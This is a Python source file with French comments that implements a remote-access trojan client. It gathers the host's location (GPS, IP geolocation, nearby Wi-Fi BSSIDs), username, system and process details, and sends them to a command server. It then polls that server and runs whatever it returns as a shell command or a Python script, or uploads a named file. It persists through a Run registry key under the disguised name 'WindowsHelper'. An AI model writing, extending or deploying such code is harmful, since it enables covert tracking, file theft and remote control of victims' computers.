#!/usr/bin/env python
import requests
import os
import time
import subprocess
import sys
import shutil
import winreg
import platform
import psutil
import getpass
import socket
import json
import logging
import geocoder  # Pour une géolocalisation améliorée

# Configuration de la journalisation
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# URL du serveur
SERVER_URL = "http://127.0.0.1:5000"
CHECK_INTERVAL = 60  # en secondes

##########################################
# Fonctions de récupération de l'IP et de localisation
##########################################
def get_public_ip():
    """Récupère l'adresse IP publique de la machine."""
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=10)
        response.raise_for_status()
        ip = response.json().get("ip", "UNKNOWN")
        logging.debug("IP publique récupérée: %s", ip)
        return ip
    except Exception as e:
        logging.error("Erreur dans get_public_ip: %s", e)
        return "UNKNOWN"

def get_gps_coordinates():
    """
    Récupère les coordonnées GPS si un module GPS est disponible.
    Pour Linux ou Raspberry Pi avec le module gpsd installé.
    """
    try:
        import gpsd
        gpsd.connect()
        packet = gpsd.get_current()
        logging.debug("Coordonnées GPS récupérées: lat=%s, lon=%s", packet.lat, packet.lon)
        return {"latitude": packet.lat, "longitude": packet.lon}
    except Exception as e:
        logging.debug("Aucune donnée GPS récupérée: %s", e)
        return {"latitude": None, "longitude": None}

def get_ip_location():
    """
    Récupère la localisation via l'IP publique en utilisant geocoder et plusieurs services.
    """
    try:
        g = geocoder.ip('me')
        if g.latlng:
            logging.debug("Localisation via geocoder: %s", g.latlng)
            return {"latitude": g.latlng[0], "longitude": g.latlng[1]}
    except Exception as e:
        logging.debug("Erreur geocoder: %s", e)
    
    services = [
        "http://ipinfo.io/json",
        "http://ip-api.com/json",
        "https://freegeoip.app/json/"
    ]
    for service in services:
        try:
            response = requests.get(service, timeout=5)
            data = response.json()
            if "loc" in data:
                lat, lon = map(float, data["loc"].split(","))
                logging.debug("Localisation récupérée via %s: lat=%s, lon=%s", service, lat, lon)
                return {"latitude": lat, "longitude": lon}
            elif "lat" in data and "lon" in data:
                logging.debug("Localisation récupérée via %s: lat=%s, lon=%s", service, data["lat"], data["lon"])
                return {"latitude": data["lat"], "longitude": data["lon"]}
        except Exception as e:
            logging.debug("Service %s indisponible: %s", service, e)
    return {"latitude": None, "longitude": None}

def get_wifi_location():
    """
    Tente de récupérer des informations de localisation via les réseaux Wi-Fi (Windows uniquement).
    Récupère la liste des BSSID visibles.
    """
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["netsh", "wlan", "show", "network", "mode=bssid"], capture_output=True, text=True)
            networks = []
            for line in result.stdout.split("\n"):
                if "BSSID" in line:
                    try:
                        mac_address = line.split(": ")[1].strip()
                        networks.append(mac_address)
                    except IndexError:
                        continue
            if networks:
                logging.debug("Réseaux Wi-Fi détectés: %s", networks)
                return {"networks": networks}
    except Exception as e:
        logging.debug("Erreur récupération Wi-Fi: %s", e)
    return {"networks": None}

##########################################
# Fonctions de récupération d'infos système
##########################################
def get_system_info():
    """
    Récupère des informations système de base.
    """
    info = {}
    try:
        info["hostname"] = os.getenv("COMPUTERNAME", socket.gethostname())
        info["username"] = getpass.getuser()
        info["os"] = platform.system()
        info["os_release"] = platform.release()
        info["os_version"] = platform.version()
        info["architecture"] = platform.architecture()[0]
        info["kernel_version"] = platform.uname().release
    except Exception as e:
        info["system_error"] = str(e)
        logging.error("Erreur récupération infos système de base: %s", e, exc_info=True)

    try:
        info["cpu_model"] = platform.processor()
        info["cpu_cores"] = psutil.cpu_count(logical=False)
        cpu_freq = psutil.cpu_freq()
        info["cpu_frequency"] = cpu_freq._asdict() if cpu_freq else {}
    except Exception as e:
        info["cpu_error"] = str(e)
        logging.error("Erreur récupération infos CPU: %s", e, exc_info=True)

    try:
        virtual_mem = psutil.virtual_memory()
        info["memory"] = {
            "total": virtual_mem.total,
            "available": virtual_mem.available,
            "used": virtual_mem.used,
            "percent": virtual_mem.percent
        }
    except Exception as e:
        info["memory_error"] = str(e)
        logging.error("Erreur récupération infos mémoire: %s", e, exc_info=True)

    try:
        disk = psutil.disk_usage(os.path.abspath(os.sep))
        info["disk"] = {
            "total": disk.total,
            "used": disk.used,
            "free": disk.free,
            "percent": disk.percent
        }
    except Exception as e:
        info["disk_error"] = str(e)
        logging.error("Erreur récupération infos disque: %s", e, exc_info=True)

    try:
        info["cpu_usage_percent"] = psutil.cpu_percent(interval=1)
    except Exception as e:
        info["cpu_usage_error"] = str(e)
        logging.error("Erreur récupération utilisation CPU: %s", e, exc_info=True)

    try:
        if hasattr(psutil, "sensors_temperatures"):
            temps = psutil.sensors_temperatures()
            info["temperatures"] = {k: [t._asdict() for t in v] for k, v in temps.items()} if temps else {}
        else:
            info["temperatures"] = {}
            info["temperatures_error"] = "sensors_temperatures non supporté par cette version de psutil"
    except Exception as e:
        info["temperatures_error"] = str(e)
        logging.error("Erreur récupération températures: %s", e, exc_info=True)

    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
        info["network_interfaces"] = {}
        if_stats = psutil.net_if_stats()
        if_addrs = psutil.net_if_addrs()
        for iface, stats in if_stats.items():
            info["network_interfaces"][iface] = {
                "isup": stats.isup,
                "speed": stats.speed,
                "mtu": stats.mtu,
                "addresses": [addr.address for addr in if_addrs.get(iface, [])]
            }
        net_io = psutil.net_io_counters(pernic=False)
        info["network_io"] = net_io._asdict() if net_io else {}
    except Exception as e:
        info["network_error"] = str(e)
        logging.error("Erreur récupération infos réseau: %s", e, exc_info=True)

    try:
        battery = psutil.sensors_battery()
        info["battery"] = battery._asdict() if battery else {}
    except Exception as e:
        info["battery_error"] = str(e)
        logging.error("Erreur récupération infos batterie: %s", e, exc_info=True)

    try:
        processes = []
        for proc in psutil.process_iter(attrs=["pid", "name", "cpu_percent"]):
            processes.append(proc.info)
        processes = sorted(processes, key=lambda p: p.get("cpu_percent", 0), reverse=True)[:5]
        info["processes_top"] = processes
    except Exception as e:
        info["processes_error"] = str(e)
        logging.error("Erreur récupération infos processus: %s", e, exc_info=True)

    return info

##########################################
# Envoi des données au serveur
##########################################
def send_location():
    """
    Envoie la localisation (GPS, IP, Wi-Fi) et les infos système au serveur.
    """
    try:
        # Récupération des coordonnées depuis les différentes méthodes
        gps_data = get_gps_coordinates()
        ip_location = get_ip_location()
        wifi_data = get_wifi_location()
        system_info = get_system_info()
        
        # Priorité : données GPS > IP
        latitude = gps_data["latitude"] if gps_data["latitude"] is not None else ip_location["latitude"]
        longitude = gps_data["longitude"] if gps_data["longitude"] is not None else ip_location["longitude"]
        
        # Regrouper les données de localisation
        location_data = {
            "latitude": latitude,
            "longitude": longitude,
            "wifi_networks": wifi_data["networks"]
        }
        
        # On envoie aussi l'IP publique (via get_public_ip)
        public_ip = get_public_ip()
        
        data = {
            "computer_name": os.getenv("COMPUTERNAME", "UNKNOWN"),
            "ip": public_ip,
            "system_info": json.dumps(system_info),
            "gps": json.dumps(location_data)
        }
        logging.debug("Envoi des données: %s", data)
        response = requests.post(f"{SERVER_URL}/localisation", json=data, timeout=10)
        response.raise_for_status()
        logging.info("Localisation envoyée avec succès pour %s", data.get("computer_name"))
    except Exception as e:
        logging.error("Erreur lors de l'envoi des données: %s", e, exc_info=True)

##########################################
# Gestion des commandes envoyées par le serveur
##########################################
def upload_file(file_path):
    """
    Lit et envoie le contenu d'un fichier vers le serveur.
    """
    try:
        if not os.path.exists(file_path):
            logging.error("Fichier non trouvé: %s", file_path)
            return
        with open(file_path, "rb") as f:
            content = f.read()
        data = {
            "computer_name": os.getenv("COMPUTERNAME", "UNKNOWN"),
            "file_path": file_path,
            "file_content": content.decode('utf-8', errors='replace')
        }
        response = requests.post(f"{SERVER_URL}/upload_file", json=data, timeout=20)
        response.raise_for_status()
        logging.info("Fichier envoyé: %s", file_path)
    except Exception as e:
        logging.error("Erreur dans upload_file: %s", e, exc_info=True)

def check_for_commands():
    """
    Vérifie s'il y a une commande à exécuter et la traite.
    """
    try:
        computer_name = os.getenv("COMPUTERNAME", "UNKNOWN")
        response = requests.get(f"{SERVER_URL}/commande", params={"computer_name": computer_name}, timeout=10)
        response.raise_for_status()
        data = response.json()
        if data.get("command"):
            cmd_data = data["command"]
            cmd_type = cmd_data.get("type", "shell")
            cmd_value = cmd_data.get("value", "")
            logging.info("Commande reçue: type=%s, value=%s", cmd_type, cmd_value)
            if cmd_type == "shell":
                try:
                    subprocess.run(cmd_value, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    logging.error("Erreur lors de l'exécution de la commande shell: %s", e, exc_info=True)
            elif cmd_type == "script":
                script_path = os.path.join(os.getenv("TEMP"), "temp_script.py")
                try:
                    with open(script_path, "w", encoding="utf-8") as f:
                        f.write(cmd_value)
                    subprocess.run([sys.executable, script_path], check=True)
                except Exception as e:
                    logging.error("Erreur lors de l'exécution du script: %s", e, exc_info=True)
            elif cmd_type == "file_upload":
                upload_file(cmd_value)
            else:
                logging.warning("Type de commande inconnu: %s", cmd_type)
    except Exception as e:
        logging.error("Erreur dans check_for_commands: %s", e, exc_info=True)

##########################################
# Ajout au démarrage de Windows
##########################################
def add_to_startup():
    """
    Ajoute le script au démarrage de Windows.
    """
    try:
        script_path = os.path.abspath(sys.argv[0])
        startup_path = os.path.join(os.getenv("APPDATA"), "WindowsHelper.py")
        if not os.path.exists(startup_path):
            shutil.copy(script_path, startup_path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "WindowsHelper", 0, winreg.REG_SZ, startup_path)
            logging.info("Script ajouté au démarrage.")
        else:
            logging.info("Script déjà présent au démarrage.")
    except Exception as e:
        logging.error("Erreur dans add_to_startup: %s", e, exc_info=True)

##########################################
# Boucle principale du client
##########################################
def main():
    logging.info("Démarrage du client...")
    add_to_startup()
    while True:
        logging.info("== Envoi de la localisation ==")
        send_location()
        logging.info("== Vérification des commandes ==")
        check_for_commands()
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
